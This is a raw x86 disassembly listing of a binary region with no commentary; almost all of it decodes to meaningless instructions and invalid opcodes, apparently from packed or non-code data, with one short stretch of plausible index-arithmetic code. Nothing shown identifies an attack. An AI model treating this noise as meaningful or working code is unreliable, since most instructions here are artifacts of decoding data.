  422a92:	sub    dl,BYTE PTR [esi*8+0x67883448]
  422a99:	mov    WORD PTR [edi+eax*4],?
  422a9c:	rcr    BYTE PTR [esi-0x482daf31],cl
  422aa2:	or     al,0xfb
  422aa4:	cmp    eax,0x98782858
  422aa9:	push   cs
  422aaa:	push   ss
  422aab:	fst    QWORD PTR [edx-0x3a]
  422aae:	ins    BYTE PTR es:[edi],dx
  422aaf:	mov    esp,0x1be4c65
  422ab4:	ret    0x6095
  422ab7:	pop    ds
  422ab8:	int    0x75
  422aba:	jno    0x422a51
  422abc:	cs xchg ebp,eax
  422abe:	xlat   BYTE PTR ds:[ebx]
  422abf:	xor    DWORD PTR [ebx],ecx
  422ac1:	es jmp 0xd9f11cf3
  422ac7:	and    DWORD PTR [ecx-0x13],edi
  422aca:	in     eax,0x9d
  422acc:	xor    bh,BYTE PTR [edx+0x45c9a623]
  422ad2:	ffreep st(1)
  422ad4:	lock aaa 
  422ad6:	nop
  422ad7:	pop    edi
  422ad8:	mov    ah,0x4d
  422ada:	fcomp  DWORD PTR ds:0x6352fcec
  422ae0:	inc    edx
  422ae1:	(bad)  
  422ae3:	pop    es
  422ae4:	xor    ax,0xe8b0
  422ae8:	mov    esp,0xe1688a66
  422aed:	and    BYTE PTR [edi],dl
  422aef:	int    0xe5
  422af1:	and    edi,eax
  422af3:	mov    ah,0x1c
  422af5:	mov    DWORD PTR [esi-0x73],esi
  422af8:	scas   al,BYTE PTR es:[edi]
  422af9:	jp     0x422ac7
  422afb:	jl     0x422b24
  422afd:	jns    0x422ae3
  422aff:	add    al,0x39
  422b01:	ret    0xfa2b
  422b04:	imul   esi,DWORD PTR [ebx+0x2b17ff30],0xc
  422b0b:	dec    ebp
  422b0c:	jp     0x422a9d
  422b0e:	daa    
  422b0f:	retf   0x3446
  422b12:	push   DWORD PTR [edi+0x35f4d811]
  422b18:	jle    0x422b67
  422b1a:	inc    edx
  422b1b:	or     al,ch
  422b1d:	cwde   
  422b1e:	and    eax,0x300291d1
  422b23:	pop    es
  422b24:	sub    cl,BYTE PTR [ebx]
  422b26:	mov    ebp,gs
  422b28:	lods   al,BYTE PTR ds:[esi]
  422b29:	mov    ds:0xa015a105,eax
  422b2e:	sub    al,0x41
  422b30:	retf   
  422b31:	enter  0x188d,0x9b
  422b35:	pop    ss
  422b36:	fld    DWORD PTR [ebx]
  422b38:	data16 fstp st(5)
  422b3b:	lds    esp,FWORD PTR [ebx+0x74]
  422b3e:	pop    ecx
  422b3f:	aas    
  422b40:	push   esi
  422b41:	inc    edi
  422b42:	mov    cs,ebx
  422b44:	mov    ds:0xce38debb,al
  422b49:	jo     0x422af1
  422b4b:	xchg   ebx,eax
  422b4c:	jo     0x422ad1
  422b4e:	sub    ebp,DWORD PTR [ebp+0x33]
  422b51:	pop    ecx
  422b52:	stos   BYTE PTR es:[edi],al
  422b53:	dec    ebp
  422b54:	mov    al,0x5a
  422b56:	xor    ebx,DWORD PTR [esi+0x59559151]
  422b5c:	inc    edx
  422b5d:	shl    bl,1
  422b5f:	test   bh,dl
  422b61:	out    0xba,eax
  422b63:	and    al,0x7b
  422b65:	sti    
  422b66:	pop    ss
  422b67:	sbb    eax,0xbfa53c72
  422b6c:	dec    eax
  422b6d:	jl     0x422b9b
  422b6f:	ds xchg ch,cl
  422b72:	leave  
  422b73:	daa    
  422b74:	add    al,0x7f
  422b76:	in     al,0xc7
  422b78:	mov    es,esp
  422b7a:	dec    edi
  422b7b:	and    edi,DWORD PTR [ecx+0x64]
  422b7e:	cmp    dl,dl
  422b80:	mov    eax,ds:0xe2da6da3
  422b85:	sub    eax,0x6a8ee985
  422b8a:	dec    DWORD PTR [edi+0x78]
  422b8d:	pop    ebp
  422b8e:	sbb    ecx,eax
  422b90:	and    esi,edi
  422b92:	es or  al,0xb8
  422b95:	or     DWORD PTR [edx+0x7b3e78c9],edi
  422b9b:	mov    ds:0x93bcb3ca,eax
  422ba0:	data16 outs dx,BYTE PTR ds:[esi]
  422ba2:	inc    esi
  422ba3:	xor    esp,ecx
  422ba5:	adc    eax,0x5ad960eb
  422baa:	rcr    BYTE PTR [eax],cl
  422bac:	inc    ebp
  422bad:	lds    esp,FWORD PTR [ebx+0x1d673b05]
  422bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bb4:	call   0xdca45597
  422bb9:	mov    bl,0xaf
  422bbb:	mov    ds:0x92ea98ba,al
  422bc0:	or     al,0xfe
  422bc2:	lock lock sub al,0x51
  422bc6:	cli    
  422bc7:	push   0xffffffdb
  422bc9:	mov    bh,0x8b
  422bcb:	out    dx,al
  422bcc:	(bad)  
  422bce:	in     al,dx
  422bcf:	pop    ebp
  422bd0:	sti    
  422bd1:	pop    edx
  422bd2:	xor    eax,0x58e11048
  422bd7:	stos   DWORD PTR es:[edi],eax
  422bd8:	sbb    ah,BYTE PTR [edi-0x4eabde32]
  422bde:	or     eax,0xf616375a
  422be3:	mov    al,0x71
  422be5:	outs   dx,DWORD PTR ds:[esi]
  422be6:	ins    BYTE PTR es:[edi],dx
  422be7:	sub    ebp,DWORD PTR [ecx-0x576d48a3]
  422bed:	out    0xb8,eax
  422bef:	add    BYTE PTR [eax+0x70],0xcd
  422bf3:	inc    edi
  422bf4:	jns    0x422b88
  422bf6:	lock jbe 0x422c06
  422bf9:	fidiv  DWORD PTR [eax-0x5696d935]
  422bff:	enter  0x95c,0xd6
  422c03:	lea    ebp,[esi-0x61]
  422c06:	xchg   BYTE PTR [esi],ch
  422c08:	xor    eax,0x44ddd4a7
  422c0d:	pop    edx
  422c0e:	adc    bl,BYTE PTR cs:[ecx]
  422c11:	je     0x422c27
  422c13:	mov    al,0x18
  422c15:	lahf   
  422c16:	jne    0x422be0
  422c18:	pop    eax
  422c19:	and    ecx,ebp
  422c1b:	cdq    
  422c1c:	sbb    DWORD PTR [edi+0x24],esi
  422c1f:	push   esp
  422c20:	ficom  WORD PTR [ebp+0x4db4934c]
  422c26:	shl    BYTE PTR [ebx+0x5d],1
  422c29:	mov    ds:0xaf94ac7d,al
  422c2e:	and    DWORD PTR [eax+0x54],0xffffff9a
  422c32:	popw   ds
  422c34:	fwait
  422c35:	repnz shl ebx,0x61
  422c39:	mov    al,0x7c
  422c3b:	lock push ebx
  422c3d:	sbb    DWORD PTR [edi+0xa],0xa666ddf3
  422c44:	adc    DWORD PTR [ebx+0x46],0xffffffdb
  422c48:	ja     0x422cb6
  422c4a:	xlat   BYTE PTR ds:[ebx]
  422c4b:	jbe    0x422bf6
  422c4d:	sub    BYTE PTR [esp+ecx*1-0x1e86b499],dl
  422c54:	add    eax,0x48c05c34
  422c59:	loop   0x422c7d
  422c5b:	mov    al,ds:0xdf6f462e
  422c60:	mov    bh,0x47
  422c62:	xor    eax,0xe89a7777
  422c67:	popf   
  422c68:	pushf  
  422c69:	pop    edi
  422c6a:	pop    esp
  422c6b:	repnz retf 0x998d
  422c6f:	scas   eax,DWORD PTR es:[edi]
  422c70:	pop    esp
  422c71:	pop    esp
  422c72:	push   ds
  422c73:	xor    BYTE PTR ss:[ebp-0x48],bl
  422c77:	outs   dx,BYTE PTR ds:[esi]
  422c78:	cwde   
  422c79:	jnp    0x422ca9
  422c7b:	mov    DWORD PTR [edx+0x74f4fbc0],0xb129cbd4
  422c85:	sbb    dh,BYTE PTR [esp+esi*1]
  422c88:	add    al,0xc2
  422c8a:	pop    eax
  422c8b:	mov    bl,0x1
  422c8d:	jge    0x422c39
  422c8f:	add    eax,0x5a8d8319
  422c94:	sub    ebp,eax
  422c96:	gs and eax,0x8f2112d1
  422c9c:	(bad)  
  422c9d:	stos   BYTE PTR es:[edi],al
  422c9e:	nop
  422c9f:	int    0x6c
  422ca1:	inc    edi
  422ca2:	mov    BYTE PTR [edx+0x21],bh
  422ca5:	ficomp WORD PTR [eax]
  422ca7:	sbb    eax,0xabb2bd3c
  422cac:	pop    esi
  422cad:	in     eax,dx
  422cae:	push   cs
  422caf:	mov    WORD PTR [ebx],?
  422cb1:	ret    
  422cb2:	lods   al,BYTE PTR ds:[esi]
  422cb3:	sub    eax,0xdc04b1e7
  422cb8:	inc    ebp
  422cb9:	loope  0x422c73
  422cbb:	jmp    0x422cda
  422cbd:	xchg   esi,eax
  422cbe:	cli    
  422cbf:	mov    esp,0x3928a415
  422cc4:	inc    esi
  422cc5:	adc    eax,eax
  422cc7:	xchg   BYTE PTR [eax],bh
  422cc9:	out    dx,eax
  422cca:	cmp    al,0xea
  422ccc:	mov    edx,0xd73ad5b5
  422cd1:	aas    
  422cd2:	add    ebx,DWORD PTR [eax-0x5782c7c2]
  422cd8:	cmc    
  422cd9:	xchg   BYTE PTR [ecx-0x4413025c],ch
  422cdf:	push   eax
  422ce0:	push   es
  422ce1:	dec    eax
  422ce2:	iret   
  422ce3:	xchg   esp,eax
  422ce4:	dec    edx
  422ce5:	loop   0x422cf1
  422ce7:	int    0x19
  422ce9:	pop    ds
  422cea:	loopne 0x422ce3
  422cec:	sbb    esi,ebx
  422cee:	add    ch,BYTE PTR [edx-0x50e1f123]
  422cf4:	ss lahf 
  422cf6:	scas   al,BYTE PTR es:[edi]
  422cf7:	stc    
  422cf8:	cmp    BYTE PTR [ebp-0x321b67fe],al
  422cfe:	jmp    0xf346:0x7905d09a
  422d05:	push   esi
  422d06:	push   0xfffffff1
  422d08:	lods   al,BYTE PTR ds:[esi]
  422d09:	mov    cl,BYTE PTR [edx]
  422d0b:	adc    cl,bh
  422d0d:	sub    al,0x12
  422d0f:	std    
  422d10:	pop    ss
  422d11:	jmp    0x422d40
  422d13:	repnz rol bl,0xc7
  422d17:	bnd ret 0xdc9
  422d1b:	sub    al,0xb
  422d1d:	fsubp  st(4),st
  422d1f:	lahf   
  422d20:	and    DWORD PTR [ebp+eax*2+0x6ee696e9],ebx
  422d27:	inc    esp
  422d28:	(bad)  
  422d29:	ror    DWORD PTR [ecx+eiz*4+0x7aa241d],1
  422d30:	ds gs rol bh,0xce
  422d35:	mov    WORD PTR [edx],ds
  422d37:	xchg   edi,eax
  422d38:	adc    DWORD PTR gs:0x19003ed8,ebx
  422d3f:	ins    DWORD PTR es:[edi],dx
  422d40:	nop
  422d41:	out    dx,al
  422d42:	and    edi,DWORD PTR [esi-0x30]
  422d45:	arpl   WORD PTR [edx+0x24182b80],ax
  422d4b:	adc    dh,BYTE PTR [ecx+0x4e]
  422d4e:	mov    ebx,0x31f1d788
  422d53:	ret    
  422d54:	lahf   
  422d55:	and    DWORD PTR [ecx+0x13d124e9],ebp
  422d5b:	mov    cs,edi
  422d5d:	and    ebp,DWORD PTR [ecx+edi*1+0x6b]
  422d61:	pop    ss
  422d62:	loop   0x422dc6
  422d64:	adc    edx,DWORD PTR [ecx-0xe]
  422d67:	lds    ebx,FWORD PTR [ecx-0x29812ea1]
  422d6d:	adc    BYTE PTR [ebx+0x2f055651],dl
  422d73:	mov    ecx,0xb44e0cc0
  422d78:	and    dx,WORD PTR [eax-0x24]
  422d7c:	mov    esp,0x59334eee
  422d81:	mov    ah,0x53
  422d83:	arpl   WORD PTR [ebp-0x7a725cce],sp
  422d89:	inc    edx
  422d8a:	repnz repnz adc ebp,eax
  422d8e:	(bad)  
  422d8f:	popa   
  422d90:	cmp    eax,0xfc469c00
  422d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d96:	push   es
  422d97:	sbb    al,0x32
  422d99:	push   ebx
  422d9a:	xchg   esi,eax
  422d9b:	fdivr  QWORD PTR [esi+0x7f820f51]
  422da1:	leave  
  422da2:	xor    edi,esi
  422da4:	xchg   esp,eax
  422da5:	pusha  
  422da6:	pop    ecx
  422da7:	adc    ah,bh
  422da9:	adc    dh,bh
  422dab:	xchg   ecx,eax
  422dac:	sub    eax,0x4a389ca
  422db1:	aad    0xef
  422db3:	mov    ebp,0x21f09a2c
  422db8:	into   
  422db9:	mov    ebx,edx
  422dbb:	je     0x422d6b
  422dbd:	pop    eax
  422dbe:	scas   al,BYTE PTR es:[edi]
  422dbf:	pop    ss
  422dc0:	push   0x8e7189b4
  422dc5:	dec    edx
  422dc6:	ins    BYTE PTR es:[edi],dx
  422dc7:	retf   
  422dc8:	cs dec edi
  422dca:	mov    al,0xc2
  422dcc:	fdiv   DWORD PTR [eax+0x4a4a7254]
  422dd2:	hlt    
  422dd3:	cmp    al,0x92
  422dd5:	mov    ebx,0x720f7179
  422dda:	add    al,0x3e
  422ddc:	add    DWORD PTR [edi+0x51],edi
  422ddf:	stc    
  422de0:	mov    esp,DWORD PTR [eax+ebp*1+0x154d4d9]
  422de7:	mov    bh,0xa2
  422de9:	adc    ch,BYTE PTR [ebx+ebp*4-0x3fbd9348]
  422df0:	pop    esi
  422df1:	mul    DWORD PTR [edx-0x77]
  422df4:	xlat   BYTE PTR ds:[ebx]
  422df5:	mov    ds:0x947c2001,al
  422dfa:	mov    eax,0xcc4d5286
  422dff:	arpl   WORD PTR [esi-0x44d291de],ax
  422e05:	jbe    0x422e6c
  422e07:	adc    DWORD PTR [ebx-0x3ba01ead],esp
  422e0d:	lahf   
  422e0e:	popa   
  422e0f:	pusha  
  422e10:	adc    BYTE PTR [eax],dl
  422e12:	retf   
  422e13:	loop   0x422e1f
  422e15:	adc    ebx,DWORD PTR [edi-0x2089f445]
  422e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e1c:	jbe    0x422e8b
  422e1e:	dec    esp
  422e1f:	dec    ebp
  422e20:	or     eax,0xcd4572d1
  422e25:	int    0xcd
  422e27:	push   edi
  422e28:	and    al,BYTE PTR [edi-0x28]
  422e2b:	dec    esp
  422e2c:	std    
  422e2d:	xchg   BYTE PTR [edi],al
  422e2f:	out    dx,eax
  422e30:	call   0x78d66fd0
  422e35:	jge    0x422e3c
  422e37:	scas   eax,DWORD PTR es:[edi]
  422e38:	or     al,0x96
  422e3a:	push   es
  422e3b:	out    dx,eax
  422e3c:	js     0x422e61
  422e3e:	popa   
  422e3f:	xchg   edi,eax
  422e40:	lea    edi,[edi]
  422e42:	retf   
  422e43:	sbb    esp,DWORD PTR [bx+si-0x3b]
  422e47:	mov    bh,0x58
  422e49:	loope  0x422ddc
  422e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e4c:	mov    edi,DWORD PTR [ebp+0x79]
  422e4f:	pop    edi
  422e50:	retf   0x612
  422e53:	sub    al,0x29
  422e55:	mov    ebp,0x208660f7
  422e5a:	sahf   
  422e5b:	sbb    ah,al
  422e5d:	or     al,0xc7
  422e5f:	test   DWORD PTR [ecx-0x13],esp
  422e62:	sub    ch,BYTE PTR [edx+0x11]
  422e65:	jnp    0x422e47
  422e67:	xor    eax,0xa0d5158f
  422e6c:	mov    eax,0x9e0981ac
  422e71:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  422e73:	xchg   DWORD PTR [ebx],edi
  422e75:	js     0x422e35
  422e77:	dec    edx
  422e78:	daa    
  422e79:	lock mov ch,ah
  422e7c:	adc    ebp,DWORD PTR [edi+0x28d17935]
  422e82:	mov    esp,0x95a95787
  422e87:	xor    DWORD PTR [ecx-0x64],esp
  422e8a:	push   ds
  422e8b:	add    eax,esi
  422e8d:	xchg   DWORD PTR [ebx],edi
  422e8f:	clc    
  422e90:	sbb    dl,BYTE PTR ss:[ecx-0x7fe9c8be]
  422e97:	adc    DWORD PTR [ebx+esi*2],edx
  422e9a:	sub    al,BYTE PTR [ebp+0x39c4d9d7]
  422ea0:	test   BYTE PTR [eax],dl
  422ea2:	push   edx
  422ea3:	mov    DWORD PTR [edi-0x2],0xd3912efd
  422eaa:	adc    BYTE PTR [eax+0x28],0xe5
  422eae:	mov    DWORD PTR [eax-0x58],0xbef195e5
  422eb5:	popf   
  422eb6:	leave  
  422eb7:	push   cs
  422eb8:	adc    DWORD PTR ds:0x2a1b2485,eax
  422ebe:	call   0x5a79548c
  422ec3:	fimul  DWORD PTR [edi-0x4b]
  422ec6:	push   ebx
  422ec7:	js     0x422e98
  422ec9:	nop
  422eca:	jo     0x422f00
  422ecc:	xlat   BYTE PTR ds:[ebx]
  422ecd:	push   ds
  422ece:	(bad)  
  422ecf:	js     0x422f25
  422ed1:	and    ch,BYTE PTR [edi+0x16299471]
  422ed7:	inc    ebp
  422ed8:	or     eax,0xd9becf15
  422edd:	sub    al,0x12
  422edf:	cmp    edi,esp
  422ee1:	xchg   ebp,eax
  422ee2:	pop    esi
  422ee3:	(bad)  
  422ee4:	aad    0xe2
  422ee6:	sbb    eax,0xb15692bf
  422eeb:	mov    DWORD PTR [ebp+eiz*8-0x65cae50f],0xbabc8e3f
  422ef6:	in     al,dx
  422ef7:	jp     0x422f6e
  422ef9:	shl    DWORD PTR [edx+edx*1+0x57],1
  422efd:	xor    BYTE PTR ds:0xdd73eb91,0x99
  422f04:	repz or DWORD PTR [esi+ecx*8-0xfab5239],esi
  422f0c:	es inc edi
  422f0e:	je     0x422ed7
  422f10:	out    dx,al
  422f11:	out    0x8b,eax
  422f13:	loope  0x422f57
  422f15:	jb     0x422f3b
  422f17:	rcl    BYTE PTR [eax-0x17fbfd6c],cl
  422f1d:	int    0x8a
  422f1f:	pop    ds
  422f20:	jp     0x422ed4
  422f22:	cmp    DWORD PTR [ebx-0x2f8187ff],ebx
  422f28:	call   0xf29a5d2
  422f2d:	pop    ecx
  422f2e:	lods   eax,DWORD PTR ds:[esi]
  422f2f:	pop    esp
  422f30:	cmp    DWORD PTR [eax-0x64],ebp
  422f33:	or     bl,BYTE PTR [ebx+0x31]
  422f36:	shr    BYTE PTR [eax-0x6dd7df14],0xf7
  422f3d:	inc    eax
  422f3e:	jnp    0x422f94
  422f40:	(bad)  
  422f41:	leave  
  422f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f43:	adc    ah,BYTE PTR [ebx-0x2daa142d]
  422f49:	fmul   DWORD PTR [esi+0x1175e97d]
  422f4f:	ins    BYTE PTR es:[edi],dx
  422f50:	mov    ebp,0x2f1fb2b0
  422f55:	sub    ebp,DWORD PTR [ebx-0x7f]
  422f58:	or     DWORD PTR [ebx-0x7442aeda],0xce1fda60
  422f62:	jno    0x422fd1
  422f64:	fwait
  422f65:	mov    ah,0x10
  422f67:	xchg   edi,eax
  422f68:	test   eax,0x56532702
  422f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f6e:	call   0x866f:0xfc02ae4a
  422f75:	cmp    eax,DWORD PTR [edi]
  422f77:	arpl   WORD PTR [eax+0xda12970],dx
  422f7d:	xor    eax,0x2274ccd2
  422f82:	int    0x8f
  422f84:	jle    0x422f8f
  422f86:	arpl   WORD PTR [esi-0x3f091908],cx
  422f8c:	cld    
  422f8d:	outs   dx,DWORD PTR ds:[esi]
  422f8e:	dec    esp
  422f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f90:	xchg   DWORD PTR [ecx-0x61],ecx
  422f93:	mov    bh,0x33
  422f95:	enter  0xde48,0x25
  422f99:	sub    ebx,DWORD PTR gs:[edx]
  422f9c:	push   eax
  422f9d:	sahf   
  422f9e:	pusha  
  422f9f:	shr    BYTE PTR [edx-0x23],0x91
  422fa3:	pop    eax
  422fa4:	inc    ecx
  422fa5:	sub    al,0x66
  422fa7:	dec    ecx
  422fa8:	call   0xf9d126fd
  422fad:	fisttp DWORD PTR [edx]
  422faf:	outs   dx,BYTE PTR ds:[esi]
  422fb0:	inc    ebx
  422fb1:	ins    BYTE PTR es:[edi],dx
  422fb2:	adc    bl,dl
  422fb4:	jo     0x422f5d
  422fb6:	push   eax
  422fb7:	loope  0x422fc5
  422fb9:	inc    ebx
  422fba:	and    dl,BYTE PTR [edi+0x77b5a993]
  422fc0:	and    edi,DWORD PTR [eax+0x260db0f3]
  422fc6:	mov    dl,0x8
  422fc8:	mov    eax,0x6a1b3f6b
  422fcd:	aaa    
  422fce:	fs jb  0x422f80
  422fd1:	rol    DWORD PTR [ebx-0x2f],1
  422fd4:	call   DWORD PTR [esi+edx*8+0x33]
  422fd8:	fsubp  st(4),st
  422fda:	mov    ds:0x279837d2,eax
  422fdf:	inc    esi
  422fe0:	mov    esi,0xc2ccf28
  422fe5:	dec    edx
  422fe6:	push   ecx
  422fe7:	gs in  al,0x2
  422fea:	pop    esp
  422feb:	xor    dl,al
  422fed:	dec    ecx
  422fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fef:	dec    ebp
  422ff0:	ja     0x42304e
  422ff2:	or     dl,BYTE PTR [ecx-0x3217a295]
  422ff8:	xchg   ebx,eax
  422ff9:	mov    gs,WORD PTR [edi+edx*2]
  422ffc:	jo     0x422fa0
  422ffe:	lahf   
  422fff:	cmp    bl,BYTE PTR [ebx]
  423001:	ret    
  423002:	dec    ebx
  423003:	xchg   BYTE PTR [esi+0x79cd100f],ch
  423009:	and    al,0xf6
  42300b:	xchg   DWORD PTR [ebp+edx*4-0x2dd83814],esi
  423012:	pop    DWORD PTR [edx+0x35]
  423015:	mov    DWORD PTR [ecx],0xb6f1bb2f
  42301b:	dec    ebx
  42301c:	sti    
  42301d:	push   0xffffffc2
  42301f:	add    al,0xae
  423021:	push   ebp
  423022:	fs xchg ebp,eax
  423024:	inc    edi
  423025:	nop
  423026:	mov    ah,0xdc
  423028:	es mov edi,0x28129dfc
  42302e:	mov    eax,ds:0x7ac0f8cb
  423033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423034:	les    edx,FWORD PTR [edi+0x4a66eb78]
  42303a:	xor    bl,BYTE PTR [edx+0x53bae17]
  423040:	cmp    eax,0x4a624449
  423045:	lds    ecx,FWORD PTR [ecx+0x16f70150]
  42304b:	(bad)  
  42304c:	mov    ds:0x184e8f61,al
  423051:	cld    
  423052:	rcr    BYTE PTR [ebp+0x5c6c2781],0xf3
  423059:	repz xchg ecx,eax
  42305b:	in     eax,dx
  42305c:	aam    0x9c
  42305e:	pop    ecx
  42305f:	push   ss
  423060:	fcomp  st(4)
  423062:	xor    cl,ah
  423064:	bound  edi,QWORD PTR [eax-0x7e]
  423067:	shl    ah,1
  423069:	test   DWORD PTR [ebx+0x39],edi
  42306c:	mov    ecx,0x6542cbcb
  423071:	out    dx,eax
  423072:	rol    BYTE PTR [edx+0x189b7215],0x88
  423079:	int    0xb3
  42307b:	jge    0x423002
  42307d:	and    al,0xfd
  42307f:	add    eax,0x848dd633
  423084:	add    bl,bl
  423086:	jb     0x4230ba
  423088:	add    BYTE PTR [edi],cl
  42308a:	mov    dh,0x55
  42308c:	push   DWORD PTR [ebx]
  42308e:	ror    BYTE PTR [eax+0x458aff55],1
  423094:	dec    DWORD PTR [ebx+0x5d8be455]
  42309a:	hlt    
  42309b:	xor    edx,esi
  42309d:	add    edx,edi
  42309f:	imul   edx,ebx
  4230a2:	mov    ebx,DWORD PTR [ebp-0x8]
  4230a5:	mov    BYTE PTR [edx+ebx*1],al
  4230a8:	mov    eax,DWORD PTR [ebp-0x1c]
  4230ab:	mov    edx,DWORD PTR [ebp-0xc]
  4230ae:	xor    eax,esi
  4230b0:	add    eax,edi
  4230b2:	imul   eax,edx
  4230b5:	mov    edx,DWORD PTR [ebp-0x8]
  4230b8:	mov    al,BYTE PTR [eax+edx*1]
  4230bb:	mov    BYTE PTR [ebp-0x1],al
  4230be:	mov    eax,DWORD PTR [ebp-0x1c]
  4230c1:	mov    edx,DWORD PTR [ebp-0xc]
  4230c4:	xor    eax,esi
  4230c6:	add    eax,edi
  4230c8:	imul   eax,edx
  4230cb:	mov    edx,DWORD PTR [ebp-0x3c]
  4230ce:	xor    edx,esi
  4230d0:	add    eax,edx
  4230d2:	jmp    0x423a4b
  4230d7:	mov    ds:0x985c80eb,eax
  4230dc:	stos   DWORD PTR es:[edi],eax
  4230dd:	arpl   WORD PTR [ebx-0x7e],sp
  4230e0:	jg     0x4230ad
  4230e2:	xchg   BYTE PTR [edx-0x4e2caff5],ah
  4230e8:	xchg   esp,eax
  4230e9:	popa   
  4230ea:	bound  eax,QWORD PTR [esi]
  4230ec:	jns    0x423150
  4230ee:	bound  esp,QWORD PTR [ebx+0x1e318612]
  4230f4:	xor    BYTE PTR [esi+edi*8],cl
  4230f7:	out    dx,eax
  4230f8:	(bad)  
  4230f9:	and    al,0x3a
  4230fb:	push   0xffffffa2
  4230fd:	retfw  0x3e59
  423101:	out    0x63,al
  423103:	or     dh,BYTE PTR [ecx+ecx*4]
  423106:	dec    BYTE PTR [ecx+0x729e0671]
  42310c:	lods   eax,DWORD PTR ds:[esi]
  42310d:	cmc    
  42310e:	out    dx,eax
  42310f:	adc    al,0x4a
  423111:	data16 (bad) 
  423113:	fadd   QWORD PTR [edi-0x492901e1]
  423119:	neg    cl
  42311b:	mov    edi,0xcd0dc5fd
  423120:	jo     0x4230cd
  423122:	jo     0x42311a
  423124:	outs   dx,BYTE PTR ds:[esi]
  423125:	shl    dh,0x5f
  423128:	gs and eax,0xf719e0e
  42312e:	in     al,0xb0
  423130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423131:	jl     0x4230da
  423133:	int3   
  423134:	sbb    dh,ch
  423136:	adc    esp,DWORD PTR [eax-0x312fafc0]
  42313c:	aaa    
  42313d:	mov    WORD PTR [esi-0x16],cs
  423140:	fiadd  WORD PTR [eax+0x625c1290]
  423146:	cmp    BYTE PTR [esi-0x56],al
  423149:	mov    bl,dh
  42314b:	fisubr WORD PTR [ebx]
  42314d:	dec    ebx
  42314e:	push   ds
  42314f:	or     eax,0x365b34c5
  423154:	mov    ebx,0x8cad246a
  423159:	loop   0x423132
  42315b:	aam    0x53
  42315d:	mov    ds:0x6eeefc09,al
  423162:	adc    cl,ah
  423164:	fisubr WORD PTR [ebp+0x79]
  423167:	loop   0x42313a
  423169:	out    0x7f,al
  42316b:	repz mov ch,0x71
  42316e:	mov    ebx,DWORD PTR [edx+0x530de733]
  423174:	iret   
  423175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423176:	stc    
  423177:	sub    al,0x28
  423179:	xchg   esi,eax
  42317a:	aad    0x1d
  42317c:	sub    BYTE PTR [esi-0x4221e343],0x4e
  423183:	das    
  423184:	pop    eax
  423185:	cs sub ecx,eax
  423188:	out    0xb2,al
  42318a:	popf   
  42318b:	mov    esi,0x871c4df8
  423190:	and    eax,0xba186ef9
  423195:	test   eax,0xb495ec1c
  42319a:	mov    ch,0xeb
  42319c:	aam    0xfc
  42319e:	xchg   edx,eax
  42319f:	adc    ebx,esi
  4231a1:	pop    esp
  4231a2:	out    0xb3,eax
  4231a4:	adc    al,BYTE PTR [ecx-0x3a1c60df]
  4231aa:	neg    BYTE PTR [eax]
  4231ac:	and    eax,0xb4c2e4c2
  4231b1:	out    0xea,al
  4231b3:	push   0x875a6cff
  4231b8:	out    dx,eax
  4231b9:	outs   dx,BYTE PTR ds:[esi]
  4231ba:	pop    edx
  4231bb:	loope  0x4231ba
  4231bd:	dec    ecx
  4231be:	fs aad 0x13
  4231c1:	fcomip st,st(0)
  4231c3:	shr    DWORD PTR [ebp+0x7c],cl
  4231c6:	cmp    al,0x85
  4231c8:	(bad)  
  4231c9:	cmp    eax,0x2f51db3b
  4231ce:	jbe    0x423186
  4231d0:	xchg   DWORD PTR [ecx+ebp*2],eax
  4231d3:	push   0xa
  4231d5:	aam    0x6d
  4231d7:	add    ecx,ecx
  4231d9:	mov    eax,fs:0x9c037b0a
  4231df:	into   
  4231e0:	loope  0x423186
  4231e2:	or     bl,BYTE PTR [eax]
  4231e4:	push   ds
  4231e5:	inc    BYTE PTR ds:0x23385390
  4231eb:	cmp    eax,DWORD PTR [esi+ecx*4]
  4231ee:	pop    eax
  4231ef:	popa   
  4231f0:	cld    
  4231f1:	fwait
  4231f2:	cdq    
  4231f3:	jmp    0xa6:0xd889f2b2
  4231fa:	out    0x95,eax
  4231fc:	add    eax,0xe584dbfe
  423201:	push   esi
  423202:	dec    ebp
  423203:	mov    al,ds:0x87fe0605
  423208:	sbb    eax,0x1ca1612
  42320d:	int3   
  42320e:	or     eax,0xb2505bb5
  423213:	xchg   BYTE PTR [eax-0x402c3e30],bl
  423219:	pop    edx
  42321a:	jmp    0x423257
  42321c:	inc    esi
  42321d:	arpl   WORD PTR [ecx+0x7b9c769d],si
  423223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423224:	fisub  DWORD PTR [ebp+ecx*1-0x1e2c723e]
  42322b:	icebp  
  42322c:	aam    0x5d
  42322e:	(bad)  
  423230:	inc    ecx
  423231:	mov    eax,DWORD PTR [edi+0x2e]
  423234:	xor    eax,0x9feb8058
  423239:	and    BYTE PTR [ebx+edi*8],0x79
  42323d:	add    DWORD PTR [edx-0x6b],ecx
  423240:	pusha  
  423241:	jnp    0x4232a0
  423243:	outs   dx,DWORD PTR ds:[esi]
  423244:	mov    DWORD PTR [ecx+0x6385469],ebx
  42324a:	popa   
  42324b:	sub    bl,al
  42324d:	sub    al,0xf9
  42324f:	in     al,dx
  423250:	arpl   WORD PTR [esi-0x34371b16],dx
  423256:	push   esi
  423257:	adc    al,0x26
  423259:	xor    ebx,0xfffffffc
  42325c:	mov    ds:0xd508e895,al
  423261:	popf   
  423262:	hlt    
  423263:	test   al,0xd2
  423265:	and    esi,DWORD PTR [edi-0x5b0d4c99]
  42326b:	push   0x19dda299
  423270:	in     eax,dx
  423271:	push   ss
  423272:	data16 scas al,BYTE PTR es:[edi]
  423274:	aaa    
  423275:	mov    ah,0xf5
  423277:	je     0x42323a
  423279:	sub    bh,ch
  42327b:	popf   
  42327c:	jb     0x42324d
  42327e:	mov    eax,ds:0x45eef223
  423283:	rcr    BYTE PTR [eax-0x4],1
  423286:	xchg   DWORD PTR [ebx],esp
